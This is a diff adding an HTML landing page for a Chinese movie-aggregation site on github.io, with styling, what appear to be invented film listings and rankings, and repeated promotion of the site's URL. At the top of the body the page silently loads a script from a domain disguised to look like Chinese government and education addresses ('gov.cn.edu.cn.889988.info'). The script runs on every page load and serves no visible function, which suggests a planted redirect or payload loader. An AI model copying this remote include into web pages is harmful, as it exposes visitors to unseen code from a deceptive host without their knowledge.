@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>丁香电影网｜丁香花开，光影常在 - 高清影视资源聚合平台</title>
+<meta name="description" content="丁香电影网(dingxiangdianyingwang-top)是一个清新雅致的影视资源聚合平台，每日精选最新院线电影、热播剧集、口碑综艺与治愈动漫。以纯粹之心，为您呈现每一帧值得回味的画面。官方网站：https://dingxiangdianyingwang-top.github.io">
+<meta name="keywords" content="丁香电影网,dingxiangdianyingwang-top,影视资源,高清电影,在线观影,电影推荐,剧集,综艺,动漫">
+<meta name="author" content="丁香电影网">
+<style>
+/* ===== 基础重置 ===== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: "PingFang SC", "Microsoft YaHei", "Hiragino Sans GB", sans-serif;
+  background: #f7f5fa;
+  color: #3a3542;
+  line-height: 1.8;
+  overflow-x: hidden;
+}
+img { max-width: 100%; display: block; }
+a { text-decoration: none; color: inherit; }
+
+/* ===== 丁香花瓣飘落背景 ===== */
+.petals { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; overflow: hidden; }
+.petal {
+  position: absolute; top: -10%;
+  width: 14px; height: 14px;
+  background: radial-gradient(circle at 30% 30%, #e8d5f5, #c9a0dc);
+  border-radius: 15px 0 15px 0;
+  opacity: 0.5;
+  animation: fall linear infinite;
+}
+@keyframes fall {
+  0%   { transform: translateY(0) rotate(0deg); opacity: 0; }
+  10%  { opacity: 0.5; }
+  100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
+}
+
+/* ===== 顶部导航 ===== */
+.topbar {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(255,255,255,0.85);
+  backdrop-filter: blur(12px);
+  border-bottom: 1px solid rgba(201,160,220,0.2);
+  box-shadow: 0 2px 20px rgba(120,90,150,0.05);
+}
+.topbar-inner {
+  max-width: 1080px; margin: 0 auto;
+  padding: 0.9rem 1.5rem;
+  display: flex; align-items: center; justify-content: space-between;
+}
+.brand { display: flex; align-items: center; gap: 0.6rem; }
+.brand-flower { font-size: 1.6rem; }
+.brand-name {
+  font-size: 1.35rem; font-weight: 700;
+  background: linear-gradient(120deg, #8a5fb0, #c9a0dc);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  letter-spacing: 1px;
+}
+.brand-slogan { font-size: 0.75rem; color: #a89db8; letter-spacing: 2px; margin-top: 2px; }
+.menu-btn { display: none; background: none; border: none; font-size: 1.6rem; color: #8a5fb0; cursor: pointer; }
+.navlist { display: flex; gap: 0.4rem; list-style: none; }
+.navlist a {
+  display: block; padding: 0.5rem 1rem;
+  font-size: 0.95rem; color: #6b6378; border-radius: 8px;
+  transition: all 0.25s;
+}
+.navlist a:hover { background: #f0e6f7; color: #8a5fb0; }
+
+/* ===== 通栏头部 ===== */
+.masthead {
+  position: relative; z-index: 1;
+  max-width: 1080px; margin: 2.5rem auto 0;
+  padding: 0 1.5rem;
+}
+.masthead-card {
+  background: linear-gradient(135deg, #ffffff 0%, #faf6ff 100%);
+  border: 1px solid rgba(201,160,220,0.18);
+  border-radius: 20px;
+  padding: 3rem 2rem;
+  text-align: center;
+  box-shadow: 0 10px 40px rgba(120,90,150,0.06);
+}
+.masthead-eyebrow {
+  font-size: 0.8rem; letter-spacing: 4px; color: #b79ed0;
+  text-transform: uppercase; margin-bottom: 1rem;
+}
+.masthead-title {
+  font-size: clamp(1.8rem, 4.5vw, 2.8rem);
+  font-weight: 800; color: #5b4a6e; margin-bottom: 0.8rem;
+  letter-spacing: 1px;
+}
+.masthead-title em {
+  font-style: normal;
+  background: linear-gradient(120deg, #8a5fb0, #d4a5e5);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+}
+.masthead-desc { font-size: 1.05rem; color: #8a8099; max-width: 640px; margin: 0 auto 1.8rem; }
+.masthead-url {
+  display: inline-block;
+  padding: 0.6rem 1.6rem;
+  background: #f4ecfb; border: 1px dashed #c9a0dc;
+  border-radius: 30px;
+  font-size: 0.9rem; color: #8a5fb0;
+  font-family: "SF Mono", Consolas, monospace;
+}
+.masthead-url:hover { background: #ede0f8; }
+
+/* ===== 通用区块 ===== */
+.section { position: relative; z-index: 1; max-width: 1080px; margin: 3rem auto; padding: 0 1.5rem; }
+.sec-head { display: flex; align-items: baseline; gap: 0.8rem; margin-bottom: 1.5rem; flex-wrap: wrap; }
+.sec-icon { font-size: 1.5rem; }
+.sec-title { font-size: 1.5rem; font-weight: 700; color: #5b4a6e; }
+.sec-line { flex: 1; height: 1px; background: linear-gradient(to right, rgba(201,160,220,0.4), transparent); }
+
+/* 影片卡片网格 */
+.film-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 1.5rem; }
+.film {
+  background: #fff; border-radius: 14px; overflow: hidden;
+  border: 1px solid rgba(201,160,220,0.12);
+  box-shadow: 0 4px 16px rgba(120,90,150,0.04);
+  transition: transform 0.3s, box-shadow 0.3s;
+}
+.film:hover { transform: translateY(-4px); box-shadow: 0 12px 30px rgba(120,90,150,0.1); }
+.film-cover {
+  height: 140px; display: flex; align-items: center; justify-content: center;
+  font-size: 3rem; color: rgba(255,255,255,0.8);
+}
+.film-body { padding: 1rem 1.2rem; }
+.film-name { font-size: 1.05rem; font-weight: 600; color: #4a4058; margin-bottom: 0.3rem; }
+.film-meta { font-size: 0.8rem; color: #a89db8; margin-bottom: 0.6rem; }
+.film-meta span { margin-right: 0.5rem; }
+.film-tag {
+  display: inline-block; padding: 2px 10px; margin-right: 0.4rem;
+  background: #f4ecfb; color: #8a5fb0; border-radius: 20px;
+  font-size: 0.72rem;
+}
+.film-link { display: block; margin-top: 0.8rem; font-size: 0.85rem; color: #b79ed0; }
+.film-link:hover { color: #8a5fb0; }
+
+/* 榜单列表 */
+.rank { background: #fff; border-radius: 14px; border: 1px solid rgba(201,160,220,0.12); overflow: hidden; }
+.rank-row {
+  display: flex; align-items: center; gap: 1rem;
+  padding: 1rem 1.5rem;
+  border-bottom: 1px dashed rgba(201,160,220,0.15);
+}
+.rank-row:last-child { border-bottom: none; }
+.rank-no {
+  font-family: Georgia, serif; font-size: 1.6rem; font-weight: 700;
+  color: #e8d5f5; min-width: 40px;
+}
+.rank-row:nth-child(1) .rank-no { color: #d4a5e5; }
+.rank-row:nth-child(2) .rank-no { color: #c9b8e0; }
+.rank-row:nth-child(3) .rank-no { color: #ddd0ea; }
+.rank-info { flex: 1; }
+.rank-info h4 { font-size: 1rem; color: #4a4058; margin-bottom: 0.2rem; }
+.rank-info p { font-size: 0.82rem; color: #a89db8; }
+.rank-score { font-size: 1.1rem; font-weight: 700; color: #b79ed0; }
+
+/* 简介段 */
+.about-card {
+  background: #fff; border-radius: 14px; padding: 2rem;
+  border: 1px solid rgba(201,160,220,0.12);
+  box-shadow: 0 4px 16px rgba(120,90,150,0.04);
+}
+.about-card p { color: #7a7088; margin-bottom: 1rem; }
+.about-card p:last-child { margin-bottom: 0; }
+.about-url {
+  color: #8a5fb0; font-weight: 600;
+  border-bottom: 1px solid #c9a0dc;
+  padding-bottom: 1px;
+}
+
+/* ===== 页脚 ===== */
+.footer {
+  position: relative; z-index: 1;
+  background: #fff; border-top: 1px solid rgba(201,160,220,0.18);
+  padding: 3rem 1.5rem 1.5rem; margin-top: 4rem;
+}
+.footer-inner { max-width: 1080px; margin: 0 auto; }
+.footer-cols { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 2rem; margin-bottom: 2rem; }
+.footer-col h4 { font-size: 1rem; color: #5b4a6e; margin-bottom: 1rem; }
+.footer-col ul { list-style: none; }
+.footer-col ul li { margin-bottom: 0.5rem; }
+.footer-col ul li a { color: #8a8099; font-size: 0.9rem; transition: color 0.2s; }
+.footer-col ul li a:hover { color: #8a5fb0; }
+.footer-bottom {
+  text-align: center; padding-top: 1.5rem;
+  border-top: 1px solid rgba(201,160,220,0.15);
+  font-size: 0.8rem; color: #b0a6bf;
+}
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+  .menu-btn { display: block; }
+  .navlist {
+    display: none; position: absolute; top: 100%; left: 0; right: 0;
+    flex-direction: column; background: #fff; padding: 1rem;
+    box-shadow: 0 8px 20px rgba(120,90,150,0.08);
+  }
+  .navlist.open { display: flex; }
+  .navlist a { padding: 0.8rem 1rem; border-radius: 0; border-bottom: 1px solid #f4ecfb; }
+  .masthead-card { padding: 2rem 1.2rem; }
+  .film-grid { grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 1rem; }
+  .rank-row { flex-wrap: wrap; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 花瓣背景 -->
+<div class="petals" id="petals"></div>
+
+<!-- 顶部导航 -->
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">
+      <span class="brand-flower">🌸</span>
+      <div>
+        <div class="brand-name">丁香电影网</div>
+        <div class="brand-slogan">丁香花开 · 光影常在</div>
+      </div>
+    </div>
+    <button class="menu-btn" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <ul class="navlist" id="nav">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#film">院线电影</a></li>
+      <li><a href="#drama">热播剧集</a></li>
+      <li><a href="#show">综艺动漫</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+  </div>
+</header>
+
+<!-- 通栏头部 -->
+<section class="masthead" id="home">
+  <div class="masthead-card">
+    <div class="masthead-eyebrow">✦ Lilac Film ✦</div>
+    <h1 class="masthead-title">丁香电影网 · <em>光影随行，温柔以待</em></h1>
+    <p class="masthead-desc">一个清新雅致的影视资源聚合平台。我们每日精选最新院线大片、热播剧集、口碑综艺与治愈动漫，以纯粹之心，为您呈现每一帧值得回味的画面。</p>
+    <div class="masthead-url">🌐 https://dingxiangdianyingwang-top.github.io</div>
+  </div>
+</section>
+
+<!-- 院线电影 -->
+<section class="section" id="film">
+  <div class="sec-head">
+    <span class="sec-icon">🎬</span>
+    <h2 class="sec-title">院线电影</h2>
+    <span class="sec-line"></span>
+  </div>
+  <div class="film-grid">
+    <article class="film">
+      <div class="film-cover" style="background:linear-gradient(135deg,#a8c0ff,#3f6ec3);">🎞️</div>
+      <div class="film-body">
+        <div class="film-name">云端告白</div>
+        <div class="film-meta"><span>爱情</span><span>2026</span></div>
+        <span class="film-tag">高清</span><span class="film-tag">口碑佳作</span>
+        <a href="#" class="film-link">查看详情 →</a>
+      </div>
+    </article>
+    <article class="film">
+      <div class="film-cover" style="background:linear-gradient(135deg,#fbc2eb,#a6c1ee);">🚀</div>
+      <div class="film-body">
+        <div class="film-name">星河彼岸</div>
+        <div class="film-meta"><span>科幻</span><span>2026</span></div>
+        <span class="film-tag">IMAX</span><span class="film-tag">震撼视效</span>
+        <a href="#" class="film-link">查看详情 →</a>
+      </div>
+    </article>
+    <article class="film">
+      <div class="film-cover" style="background:linear-gradient(135deg,#d4a5e5,#8a5fb0);">🕵️</div>
+      <div class="film-body">
+        <div class="film-name">无声证言</div>
+        <div class="film-meta"><span>悬疑</span><span>2026</span></div>
+        <span class="film-tag">烧脑</span><span class="film-tag">反转</span>
+        <a href="#" class="film-link">查看详情 →</a>
+      </div>
+    </article>
+    <article class="film">
+      <div class="film-cover" style="background:linear-gradient(135deg,#f6d365,#fda085);">🌿</div>
+      <div class="film-body">
+        <div class="film-name">山间来信</div>
+        <div class="film-meta"><span>文艺</span><span>2026</span></div>
+        <span class="film-tag">治愈</span><span class="film-tag">慢节奏</span>
+        <a href="#" class="film-link">查看详情 →</a>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- 热播剧集 -->
+<section class="section" id="drama">
+  <div class="sec-head">
+    <span class="sec-icon">📺</span>
+    <h2 class="sec-title">热播剧集</h2>
+    <span class="sec-line"></span>
+  </div>
+  <div class="rank">
+    <div class="rank-row">
+      <div class="rank-no">01</div>
+      <div class="rank-info">
+        <h4>长风渡·归尘</h4>
+        <p>古装 · 江湖恩怨与朝堂权谋交织，群像刻画细腻动人</p>
+      </div>
+      <div class="rank-score">9.2</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-no">02</div>
+      <div class="rank-info">
+        <h4>此刻的我们</h4>
+        <p>都市情感 · 三对男女的当代生活切面，真实而温暖</p>
+      </div>
+      <div class="rank-score">8.9</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-no">03</div>
+      <div class="rank-info">
+        <h4>深海谜案</h4>
+        <p>悬疑犯罪 · 海岛连环谜案，层层剥茧抽丝</p>
+      </div>
+      <div class="rank-score">8.7</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-no">04</div>
+      <div class="rank-info">
+        <h4>少年游</h4>
+        <p>青春校园 · 关于成长、选择与和解的夏天</p>
+      </div>
+      <div class="rank-score">8.5</div>
+    </div>
+  </div>
+</section>
+
+<!-- 综艺动漫 -->
+<section class="section" id="show">
+  <div class="sec-head">
+    <span class="sec-icon">🎨</span>
+    <h2 class="sec-title">综艺 · 动漫</h2>
+    <span class="sec-line"></span>
+  </div>
+  <div class="film-grid">
+    <article class="film">
+      <div class="film-cover" style="background:linear-gradient(135deg,#ffecd2,#fcb69f);">🎤</div>
+      <div class="film-body">
+        <div class="film-name">声音的旅程</div>
+        <div class="film-meta"><span>音乐综艺</span><span>更新中</span></div>
+        <span class="film-tag">现场LIVE</span><span class="film-tag">实力唱将</span>
+        <a href="#" class="film-link">查看详情 →</a>
+      </div>
+    </article>
+    <article class="film">
+      <div class="film-cover" style="background:linear-gradient(135deg,#a18cd1,#fbc2eb);">🍳</div>
+      <div class="film-body">
+        <div class="film-name">三餐四季</div>
+        <div class="film-meta"><span>生活纪实</span><span>更新中</span></div>
+        <span class="film-tag">美食</span><span class="film-tag">治愈</span>
+        <a href="#" class="film-link">查看详情 →</a>
+      </div>
+    </article>
+    <article class="film">
+      <div class="film-cover" style="background:linear-gradient(135deg,#84fab0,#8fd3f4);">🌸</div>
+      <div class="film-body">
+        <div class="film-name">花与剑的歌谣</div>
+        <div class="film-meta"><span>国漫新番</span><span>连载中</span></div>
+        <span class="film-tag">唯美画风</span><span class="film-tag">热血</span>
+        <a href="#" class="film-link">查看详情 →</a>
+      </div>
+    </article>
+    <article class="film">
+      <div class="film-cover" style="background:linear-gradient(135deg,#fccb90,#d57eeb);">🌙</div>
+      <div class="film-body">
+        <div class="film-name">月下事务所</div>
+        <div class="film-meta"><span>治愈番剧</span><span>完结</span></div>
+        <span class="film-tag">轻松</span><span class="film-tag">日常</span>
+        <a href="#" class="film-link">查看详情 →</a>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- 关于我们 -->
+<section class="section" id="about">
+  <div class="sec-head">
+    <span class="sec-icon">💌</span>
+    <h2 class="sec-title">关于丁香电影网</h2>
+    <span class="sec-line"></span>
+  </div>
+  <div class="about-card">
+    <p>丁香电影网（dingxiangdianyingwang-top）是一个专注于影视资源聚合与分享的清新平台。我们不求繁杂，只愿在喧嚣之中，为您留一处安静的光影角落。</p>
+    <p>从院线大片到独立佳作，从经典剧集到小众番剧，每一份内容都经过精心筛选，只为匹配您此刻的心境与期待。</p>
+    <p>官方网站地址：<a href="https://dingxiangdianyingwang-top.github.io" class="about-url">https://dingxiangdianyingwang-top.github.io</a></p>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-cols">
+      <div class="footer-col">
+        <h4>网站导航</h4>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#film">院线电影</a></li>
+          <li><a href="#drama">热播剧集</a></li>
+          <li><a href="#show">综艺动漫</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#about">网站简介</a></li>
+          <li><a href="#">内容合作</a></li>
+          <li><a href="#">免责声明</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>官方信息</h4>
+        <ul>
+          <li>网站名称：丁香电影网</li>
+          <li>访问地址：dingxiangdianyingwang-top.github.io</li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      © 2026 丁香电影网 dingxiangdianyingwang-top.github.io · 丁香花开，光影常在
+    </div>
+  </div>
+</footer>
+
+<script>
+// 生成飘落花瓣
+(function(){
+  var container = document.getElementById('petals');
+  for (var i = 0; i < 18; i++) {
+    var p = document.createElement('div');
+    p.className = 'petal';
+    p.style.left = Math.random() * 100 + '%';
+    p.style.animationDuration = (Math.random() * 8 + 7) + 's';
+    p.style.animationDelay = (Math.random() * 10) + 's';
+    p.style.width = p.style.height = (Math.random() * 8 + 8) + 'px';
+    container.appendChild(p);
+  }
+})();
+</script>
+</body>
+</html>
